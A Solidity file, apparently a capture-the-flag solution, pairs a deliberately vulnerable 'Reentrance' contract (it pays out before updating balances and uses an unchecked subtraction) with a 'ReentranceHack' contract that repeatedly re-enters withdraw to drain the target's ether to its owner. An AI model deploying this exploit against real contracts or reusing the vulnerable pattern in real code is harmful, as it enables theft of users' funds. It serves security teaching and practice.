// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/release-v3.4/contracts/math/SafeMath.sol';

contract Reentrance {

    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value:_amount}("");
            if(result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract ReentranceHack {
    Reentrance private target;
    address payable private owner;

    constructor(Reentrance _target) public {
        owner = msg.sender;
        target = _target;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner!");
        _;
    }

    function targetBalance() public view returns(uint) {
        return address(target).balance;
    }

    function attack() external payable onlyOwner {
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        uint tb = targetBalance();
        if (tb > 0) {
            target.withdraw(msg.value < tb ? msg.value : tb);
        } else {
            owner.transfer(address(this).balance);
        }
    }
}